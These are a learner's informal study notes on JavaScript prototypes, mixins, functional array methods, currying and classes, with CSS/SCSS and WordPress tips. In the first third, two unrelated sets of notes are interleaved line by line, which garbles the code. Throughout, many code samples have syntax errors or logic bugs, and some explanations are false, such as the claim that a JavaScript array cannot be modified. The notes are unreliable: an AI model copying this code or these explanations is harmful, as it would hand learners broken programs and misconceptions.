to make an inheritance to an object and still be able to alter that object, you can make a subdivision of an object and that inheritance goes to the prototype
fetch an html from an attribute
  Dog.prototype = Object.create(Animal.prototype)
				const likeCount = likeBox.find('.like-count').html();
if you want to just round some borders 
when dog.prototype was created, the old constructor disappears and the new one is the one that was set last (animal.prototype)
     
      border-radius: 9px 15%;
to reverse this, just set the constructor after all the functions are set
getting the id of an post 
  Bird.prototype = Object.create(Animal.prototype);
     <?php echo $query->posts[0]->ID ?>
if you inspect an element, you will notice that the pixel amount is not what you set if you have padding and margins
    bird.prototype.constructor = object.create(Animal.prototype)
to combat this 
  Dog.prototype = Object.create(Animal.prototype);
      * {
    Dog.prototype.constructor = object.create(animal.prototype)
plugin development 
            box-sizing: border-box;
you can overrwrite an function by just rewriting and adding what you want
      }
sometimes you just want one quality to be shared among both things, and sometimes a common aspect is not the best solution,
query vars 
inheritance does not work well with birds and airplanes, theyy both can fly but they arent the same thing
     https://www.udemy.com/course/become-a-wordpress-developer-php-javascript/learn/lecture/8362044#overview
  to bypass that, you can create a specific function called flying and add the object after
     
to select every element that doesnt have an rule you use :not(example)
      div:not(.classname) {
      let flying = function(obj) {
      }
        obj.fly = function() {
          console.log('wooosh, im flying')
styling an entire page can be a nightmare, pseudo selectors are here to help 
        }
      selector[class~='classname'] will select any element that INCLUDES that class name, without it, only selects the classes with the exact classnames
      }
      to make something only for screen readers 
      to call for that just use flying(bird)/flying(airplane);
            span[class~="sr-only"] {
in this exercise 
                  border: 0;
  function Animal() { }
                  clip: rect(1px, 1px, 1px, 1px);
  Animal.prototype.eat = function() { console.log("nom nom nom"); };
                  clip-path: inset(50%);
  function Dog() { }
                  -webkit-clip-path: inset(50%);
  // Only change code below this line
                  width: 1px;
  Dog.prototype = Object.create(Animal.prototype);
                  height: 1px;
  Dog.prototype.constructor = Dog;
                  }
  Dog.prototype.bark = function() {
    console.log('Woof!')
to select the first element of a type 
  };
      element:first-of-type
  // Only change code above this line
to select the last element of a type 
  let beagle = new Dog();
      element:last-of-type
    the objective was so that the animal could use the function eat & the function bark
    first we create the Dog.prototype and make it equal to Object.create(Animal.prototype)
to make an object 
      this means that if something changes in the animal prototype, it will change in the dog prototype aswell
      $colors : (
      then we make the Dog.prototype constructor the Dog because if i want to change something in the variables that arent prototypes i can do so
            color: $red,
      then we add the function bark 
      )
if you want a function to be immediately invoked, after everything you use this syntax
to make a for loop 
  (function () {
      @for $i from 1 trough 12 {
    console.log('chirp chirp');
            .col-#{$i} {
  })();
                  width: 100px
IIFE (immediately invoked) is often used to group related funtionality into a single objext or module. for example 
            }
  function glideMixin(obj) {
    obj.glide = function() {
      }
      console.log("Gliding on the water");
      # is used to interpolate text 
    };
  }
to map keys in object 
  function flyMixin(obj) {
      @each $key, $value in $colors {
    obj.fly = function() {
      }
      console.log("Flying, wooosh!");
    };
if you want to avoid repetition, you can alter the html with css  
  }
      p: Before {
we can group these mixins into a module as follows:
            content: "SOMETHING"
  let motionModule = (function () {
      }
 return {
      glideMixin: function(obj) {
you dont need to use the flexbox when youre trying to make things in a line 
        obj.glide = function() {
you can make the objects with position relative and float left/right
          console.log('glidin on the water);
        };
the ::before and ::after selectors
      },
      will select pseudo elements after the targeted selectors 
      flyMixin: function(obj) {
        obj.fly = function(obj) {
if you want to have lazy loading in an image add 
          console.log('im flying babyy');
      <img src='#' alt='#' loading='lazy' />
        };
      }
lazy loading is the process of loading something only when you need it
    }
  }
to make 3 columns in grid
    motionModule.glideMixin(duck);
      selector {
    to do this group, first you have to tinitialize, using an IIFE  then you create a return part where you put your functions
            display: grid;
            grid-template-columns: size size size;
    and you transform them in functions for an object 4head
      }
    dont forget to use }, & };
functional programming is a style  of programming  where solutions are simple isolated functions, without any side effects outside of the function scope
the minmax makes the grid more responsive 
  input -> process -> output
minmax(2rem, 1fr) minmax(min-content, 94rem) minmax(2rem, 1fr);
functional progeamming is about 
  isolated functions (there is no dependance on the state of the program, witch includess global variables that are sucject to change)
sometimes you dont know how many elements youre going to have, so its good to be dynamic 
  pure functions - the same input always gives the same output
  functions with limited side effects - any changes or mutations, to the state of the program outside the fucntion are careffully controled
using the grid-auto-flow takes row or column 
you can assign a variable to a function and a return node
  const prepareGreenTea = () => 'greentea';
if you want something to be inline, instead of using display flex, use the prop inline 
  will return greentea
      {
on this exercise
            .class > li { // selects the first element and make everything inline with this element
a good practice of functional programming is to always declare your dependencies explicitly. meaning that if a function depends on a variable 
                  display: inline
            }
or object being present then pass that variable or object directly into the function as an argument
      }
its easier to test ,you know what input it takes, and it wont depend on anything else in your program
instead of using a function like this
  var fixedValye = 4;
  function incrementer () {
    return fixedValue + 1;
  }
look at this... discusting, now if we change anything we can get bugs to appear, instead lets use this
    var fixedValue = 4;
    function incrementer (argument) {
      argument = fixedValue + 1;
      return argument;
    }
beautiful, now you have an argument that you know exactly what is needed to function, you dont need to directly use the variable fixed value because if we want to change it,
we just need to change one thing that is the variable fixedValue name
using something like var newArr = arrVar, where arrVar is an array will simpply create a reference to the existing variable and not a copy. so changing a value
in newArr would change the value in arrVar
DECLARE FUNCTION PARAMETERS
dont be a lazy bum and put the parameters, its way better and everyone around you will clap and chant your name
passing by reference bersus value 
pass By value (primitives);
  b = 2
  a = b
  console.log(a) = 2
  console.log(b) = 2
in this exercise
  var bookList = ["The Hound of the Baskervilles", "On The Electrodynamics of Moving Bodies", "Philosophiæ Naturalis Principia Mathematica", "Disquisitiones Arithmeticae"];
  function add(arr, bookName) {
    let newArr = [...arr]; 
    newArr.push(bookName); 
    return newArr; 
  }
  function remove(arr, bookName) {
    let newArr = [...arr]; 
    if (newArr.indexOf(bookName) >= 0) {
   
      newArr.splice(newArr.indexOf(bookName), 1); 
      return newArr; 
    }
  }
  var newBookList = add(bookList, 'A Brief History of Time');
  var newerBookList = remove(bookList, 'On The Electrodynamics of Moving Bodies');
  var newestBookList = remove(add(bookList, 'A Brief History of Time'), 'On The Electrodynamics of Moving Bodies');
  console.log(bookList);
  this one is easy, just looks intimidating by its size
  first you create a new array to modyfy the properties, since modifying the original array on javascript is impossible
  then you add the parameters to the functions, being arr and bookname, 
  arr gets in the variable declaring by being a placeholder on the new array
  then you just push the new book
  to to remove, you do almost the same thing 
  first you use the same placeholder on the array
  then you check if the book exists, using the notation .indexOf, if the index of that bookname is over or equal to 0
  then it passes and you remove that thing
  and return the new array
functions are considered first class objects in javascript which means they can be used like any other object. they can be saved in variables, stored in and
object, or passed as function arguments
the .map method iterates over each item in an array and returns a new array containing the results of calling the callback function on each element. it does 
this without mutating the original array
When the callback is used it is passed three arguments. the first argument is the current element being processed, the second is the index of that element and 
the third is the array upon which the map method was called
  const names = users.map ( user => user.name);
  console.log(names);
    ['John','Amy','camperCat']
using the .map function it returns an array, but you can filter the messages that you want on that array
  for example in this exercise
  var watchList = [
   {
     "Title": "Inception",
     "Year": "2010",
     "Rated": "PG-13",
     "Released": "16 Jul 2010",
     "Runtime": "148 min",
     "Genre": "Action, Adventure, Crime",
     "Director": "Christopher Nolan",
     "Writer": "Christopher Nolan",
     "Actors": "Leonardo DiCaprio, Joseph Gordon-Levitt, Ellen Page, Tom Hardy",
     "Plot": "A thief, who steals corporate secrets through use of dream-sharing technology, is given the inverse task of planting an idea into the mind of a CEO.",
     "Language": "English, Japanese, French",
     "Country": "USA, UK",
     "Awards": "Won 4 Oscars. Another 143 wins & 198 nominations.",
     "Poster": "http://ia.media-imdb.com/images/M/MV5BMjAxMzY3NjcxNF5BMl5BanBnXkFtZTcwNTI5OTM0Mw@@._V1_SX300.jpg",
     "Metascore": "74",
     "imdbRating": "8.8",
     "imdbVotes": "1,446,708",
     "imdbID": "tt1375666",
     "Type": "movie",
     "Response": "True"
    },
theres a ton of information that we dont need so lets add the info that we need into an array
first we need to make the map function
  const ratings = watchList.map(item => ({
    title: item["Title"],
    rating: item["imdbRating"]
  }));
 first we create two categories that we want, title and rating, next using the item notation, it takes whatever it has on the item["Title"], 
 and the same for the rating
map method returns an array of the same length as the one it was called on. it also doesnt alter the original array as long as its callback function doesnt
using the .filter notation, it takes an array, filters it with the thing that its lloonking for, and it returns the whole index
in this exercise 
  var filteredList = watchList
    .map(function(e) {
      return { title: e["Title"], rating: e["imdbRating"] };
    })
    .filter(e => e.rating >= 8);
  console.log(filteredList);
  this exercise we learn something totally cool and not at all annoying bc i had to look at the answers and find out that this mechanic was never brought it up
  well someday, you might want to do more than just one operation like, you want to map and filter the options
  well you can, after you use .map, just use .filter right after without anything else 
 concatenation means to join items end to end. javascript offers the concat method for both strings and arrays that work the same way. for arrays the method is called on
 one, then another array is provided as the argument to concat, witch is added to the end of the first array. it returns a new array and does not mutate either
of the original arrays 
  arr1.concat(arr2)
you can do this thing
  var averageRating = 
          watchList
            .filter(film => film.director === "christopher Nolan")
            .map(film = Number(fil,.imdbRating))
            .redice((sumOfRatings,rating) => sumOfRatings + rating)/ watchList.filter(film => film.director === "christopher Nolan").length
        return averageRating
you can convert strings to numbers using the method Number()
in this exercise
    const squareList = arr => {
    // Only change code below this line
    return arr
              .filter(e => e > 0 && e % parseInt(e) === 0)
              .map(e => Math.pow(e,2));
    // Only change code above this line
  };
  we have to take an array and make all the integers that are above 0 and power them by 2
    first we have to return the array, then we use the notation .filter to filter out the numbers < 0 and then to make only integers we use the function 
    & === 0 , that function in javascript is to see if the number is divisible by an number, we take the number and use the parseInt to convert an number 
    to an integer.
      .filter(e => e > 0 && e % parseInt(e) === 0)
    then we have to power them by two, for that we use the notation Math.pow, Math is to indicate that we want to use math, pow is that the operation that 
    we want to use is the power functio , it takes 2 arguments, the number and how much you want to power to
      .map ( e => Math.pow(e,2));
using the sort method it sorts the elements of an array according to the callback function
  function ascendingOrder(arr) {
    return arr.sort(function(a,b)) {
      return a - b;
    });
  }
  ascendingOrder([1,5,3,2,4]);
    this would return the value [1,2,3,4,5];
  
  function reverseAlpha(arr) {
    return arr.sort(function(a,b)) {
      return a === b ? 0 : a < b ? 1 : -1;
    });
  }
  reversealpha([l,h,z,b,s]);
    this would return [z,s,l,h,b]
    this is an elaborate if statement, weve wseen this before, but for a simple lookback, ill try to explain it
      a === b ? 0 // this is the first statement, meaning that is the more important one, means that if a is exactly b, then return 0
      a < b ? 1 // this is an else if statement, meaning that if index a (every letter has an index number so to speak from 1 to 26 and a is 1) is less than b
                // then return 1
       1        //this is an else, meaning that if a > b, return 1
    this sequence makes so that it organizes the array into a sequence of -1 , 0 , 1 going from the largest number to the smallest
    if you want to make it so that it goes from smallest to largest, write
    a === b ? 0 : a > b ? 1 : -1;
A side effect of the sort method is that it changes the order of the elements in the original array. in other words, it mutates the array in place.One 
way to avoid this is to first concatenate an empty array to the one being sorted (remember that slice and concat return a new array), then return the 
sort method 
  this can be evaluated by this exercise
    var globalArray = [5,6,3,2,9];
    function nonMutatingSort(arr) {
      return [].concat(arr).sort(function(a,b) {
        retrun a === b ? a > b ? 1 : -1;
      }
    }
    to copy an array and return a new array without copying the old one, you can use the .concat notation and [] to create a new array, (i dont know 
    where its stored if you dont put a variable to it);
the split method splits a string into an array of strings. it takes an argumetn for the delimiter, which can be a character to use to break up the 
string or a regular expression. For example, if the delimiter is a space, you get an array of words, and if the delimiter is an empty string, you get an 
array of each character in the string, you get am array of each character in the string. 
  Here are two examples that split one string by spaces, then another by digits using a regular expression:
    var str = 'hello world';
    var byS[ace = str.split(' ');
    var otherString = ' how are you today ';
    var byDigits = otherString.split(/\d\/g);
      bySpace would have return the value of ['hello', 'world'] and byDigits would have returned the value ['how','are','you','today']
        since strings are immutable, the split method makes it easier to work with them
      use regular expression to split more than one character (best practice omegalul);
the join notation is used to join the alements of an array together to create a string. it takes an argument for the delimiter that is used to separate the
aray elements in the string 
  var arr ["Hello","There"];
  var str = arr.join(" ");
you can change notations togheter just by writing them after for example
  str.split(/\W/).join(" ");
  this takes a string and removes the non alphabetic and numeric characters, wich returns an array, then using the join notation, we merge the array with a space
  in between
from computing averages to sorting, any array operation can be achieved by applying. recall that map and filter are special cases of reduce
lets cobined what weve learned to solve a pratical problem 
many content management sites(cms) have the titles of a post added to part of the URL for simple bookmarking purposes. for example, if you write 
a medium post titled stop using Reduce, its likely the URL woulld have some for of the title string in it(.../stop-using-reduce). you may have 
already noticed this on the freecodecamp site
if theres an blank space on the beginning of your sentence, use the notation .trim()  
to see if every element of an array passes an certain test. use the .every method
  var numbers = [1,5,8,0,10,11];
  numbers.every(function(currentValue) {
    return currentValue < 10;
  }
    in this case, it would return false, because not every member is greater than 10
The some method works with arrays to check if any element passes a particular test. it returns a boolean value- true if any of the valyes meet the criteria
  For example, the following code would check if any element in the numbers array is less than 10
  var numbers = [10,50,8,220,110,11]
  numbers.some(function(currentValue) {
    return currentValue < 10;
  });
        this whis would return true by the some notation, but false by the every notation
the arity of a function is the number of arguments it requires. currying a function means to convert a function of n arity into functions of arity 1
in other words, it resttructures a function so it takes one argument, then returns another function that takes the next argument and so on
  heres an example  
    function unCurried(x,y) {
      return x + y;
    }
    function curried(x) {
      return function(y) {
        return x + y;
      }
    }
  const curried = x => y => x + y;
  curried(1)(2);
  this is useful in your program if you cant supply all the arguments to a function at one time. you can save each function call into a variable
  wich will hold the returned function reference that takes the next argument when its available, heres an example using the curried function in the 
  example above
    var funcForY = curried(1);
    console.log(funcForY(2)); //3
    similarly, partial application can be described as applying a few arguments to a function at a time and returning another function that is applied 
    applied to more arguments. heres an example
    function impartial (x,y,z) {
      return x + y + z;
    }
    var partialFn = impartial.bind(this,1,2);
    partialFn(10); // 13
the bind notatien creates a new function that when called has the keyword this defined with the input value, with a sequence determined of arguments
before every other value for when the function is called
  
imagine a train station, where after the train has everyone on board, only then the train will leave,
the instruction that you want to be the last is the thing that has everything inside it, meaning the instructions of what to do
  function add(x)  {
    return function(y) {
      return function(z) {
        return x + y + z;
      }
  }
    }
INTERMEDIATE ALGORITHM SCRIPTING
to discover the min and max of two numbers use the Math.min && Math.max notation
  to discover the sum of an array 
    function sumAll(arr) {
      let min = math.min(arr[0],arr[1]);
      let max = math.min(arr[0],arr[1]);
      let array = 0;
    
      for(let i 0; i <= max; i++) {
        array += i;
      }
    }
on this exercise we have to compare two arrays and return a new array with any items only found in one of the two arrays, but not both. in 
other words, return the symmetric difference of the two arrays
    function diffArray(arr1, arr2) {
      var newArr = [];
      function count (first,second) {
        for (let i = 0; i < first.length;i++) {
              newArr.push(first[i]);
            if (second.indexOf(first[i]) === -1) {
            }
          }
      }
          count(arr1,arr2);
          count(arr2,arr1);
      return newArr;
    }
    diffArray([1, 2, 3, 5], [1, 2, 3, 4, 5]);
  first, we need to create an array to store the new information, then we need to create the fuction that does the job for us, using the first and second
  as parametersthen we create a for loop that goes to the "first" array, then we create an if statement that sees if the second array has the index of 
  the i and if its equal to -1 (meaning that was not on the other one), if that statement is true, then push the i 
  then we need to initialise the function containing the arr1 and arr2 as first and the other (arr2,arr1) as the second, to make the difference to each one
in this exercise
    function destroyer(arr) {
      let deleteNumbers = Object.values(arguments).slice(1);
      for (let i = 0; i < arr.length;i++) {
        for (let j = 0; j < deleteNumbers.length; j++) {
          if (arr[i] === deleteNumbers[j]){
            delete arr[i];
          }
        }
      }
      return arr.filter(item => item != null);
    }
    destroyer([1, 2, 3, 1, 2, 3], 2, 3);
   we have to see if an number in an array corresponds to  an argument, if it does, delete that number from the array
    we dont need to create a new array to store the new numbers in this exercise so we dont need to create the array, but we do need to create something different
    we need to create an arguments variable
      arguments
        arguments is an array like object accessible inside functions that contains the values of the arguments passed to that function 
        so in the exercise the arguments on the array ([1,2,3,1,2,3]2,3) are 2 and 3;
        array like means that arguments has a length property and properties indexed from zero but it doesnt have arrays biult in methods like forEach() or 
        map()
        The Arguments object is a local variable available within all non-arrow fucntions. you can refer to a functions arguments inside that functions arguments 
        inside that functions arguments inside that function by using its arguments object. it has entries for each argument the function was called with, 
        for example if a function is passed 3 arguments, you can access them as follows
          arguments[0] = first argument
          arguments[1] = second argument
          arguments[2] = third argument
    create an array of values to remove using Object.values(arguments).slice(1) and store it in the varable valsToRemove. well use this to check against arr
    then create 1 loop to iterate through arr, and change the integer variable j
    and arr to vals to remove, this second loop is going to iterate through vals to remove
    then if the value of i is equal to the value of j, then delete the value of i
we have to write an algorithm that will take an array for the first argument and return an array with all the objects that matches all the properties 
and values in the object passed as second parameter
  in this exercise we have to use the object.keys method, and with that we can cycle through an object keys 
    first we have to add a variable to it, well use scr (let scr = Object.keys(source))
      then we have to return the function, because since we have to return the array and if the source doesnt match any, we have to return false, if
      it does we have to return true, then we have to filter the array, using the method
        return collection.filter(function(obj) {
        }
      then we have to cycle through the array of object keys, so we use the for loop
      for(let i=0;i<src.length;i++) {
      }
      then we have to return false if it doesnt find anything, well use 2 methods and doing it in the same if statement, well have to join them togheter by an ||
      if (!obj.HasOwnProperty(src[i]) || obj.scr[i] != source[scr[i]]) {
        return false;
      }
      on the first one if the object doesnt have its own property then return false
      on the second one, if the obj key doesnt happen to be the source, then return false
      the final result is
        function passArray(collection,source) {
            let src = Object.keys(source);
          return Collection.filter(function(obj) {
            for(let i=0;i<src.length;i++) {
              if (!obj.hasOwnProperty(scr[i]) || obj[scr[i]] != source[scr[i]]) {
                rerturn false
              }
            }
              return true;
          });
Array.isArray() returns true if an object is in an array 
 
Datacamp 
to see if a number is an int 
  Number.isInteger(numb);
you can use if statements on variable assignments
  let tool = newVar || 'string'
    if newVar is empty, tool contains 'string'
  helper functions you can return value of a function inside another function. these functions are refered to as helper functions 
  fucntion multiplyByNineFifths(number) {
    return number * (9/5);
  }
  function getFahrenheit(celsius) {
    return multiplyByNineFifths(celsius) + 32;
  }
  getFahrenheit(15) // returns 59;
 you can use default parameters on functions 
  const function = (fruit = 'apple') => console.log(`hmmmm i love ${fruit}`)
  function() // returns hmmmm i love apple
  
if the property of an object is the same as the variable you want to assign to 
  const {variableName} = object
    its the same as
  const variableName = object.variableName;
if you want to see the keys of an object 
  Object.keys(objname);
if you want to see the entries (everything that the object has (returns an array for each property)) 
  Object.entries(objname);
if you want to assign a property to an object 
  Object.assign({
    item1 : value1,
    item2 : value2
  })
 
 
functions as data 
    you can assign functions as variables for example 
      function checkThatTwoPlusTwoIsFourAMillionTimes () {
        let i =0;
        while(i <= 100000) {
          if (2 + 2 != 4) {
            console.log('Something is not right')
          }
        }
      }
      const 2p2e4 = checkThatTwoPlusTwoIsFourAMillionTimes
  you can also see the properties 
    function.name // returns the original name of the function if you reassigned
    function.length // returns the number of arguments 
    function.apply // calls a function and set its this to the provided this Arg. Arguments can be passes as an array object 
    function.bind // creates a new function which when called has its this set to the provided thisArg. optionally a given sequence of arguments will be prepended to arguments provided the newly bound fucntion is called
functions as parameters 
	if you dont use the () in a func assignment in a function you can use it as an parameter
		const funcName = (func) => {
			console.log(func.name);
		}
javascript Error Types 
     SyntaxError <- this error will happen when someone makes an invalid code, code that cannot be interpreted by the compiler. When the error is thrown, scan your code to make sure
          you properly opened and closed all brackets, braces, and parentheses and that you didnt include any invalid semicolons.
     RefereceError <- this error will happen when you use a variable that does not exists, make sure that the variables are properly declared
     TypeError <- this error will happen if you attempt to perform an operation on a value of the wrong type.
     
classes
     constructor
          constructor is called when you use the new keyword, its creating a new instance of the class
               class Dog {
                    constructor(name) {
                         this.name = name;
                         this.behavor = 0;
                    }
               }
               dog <- name of the class. capitalize and camelCase class names
               constructor <- we invoke the constructor() every time you create a new instance of that class
               this. <- this makes so we can use the new name of the class for example: const obj = new Object;
                                                                                          obj.name;
instance
     you are able to make new classes instances by using the new keyword
          const doggie = new Dog('good dog');
inheritance
     extends <- makes the methods of the main class also works on the subclass
     super <-passes the argument of the subclass to the constructor of the main class;
          if you create something in the main class, youll be able to use it on the sub class;
          however, if you create something in the subclass, it will not be able to be used in the main class
sometimes you want a class that have methods that arent available in individual instances but can call directly from the class
     class Animal {
          constructor(name) {
               this._name = name;
               this._behavior = 0;
          }
          static generateName() {
               const names = ['angelica','robert','camila']
               return names[Math.round(Math.random() * names.length )]
          }
     }
     now you can use the .generateName in the Animal class but if you want to create an instance of it, you wont be able to
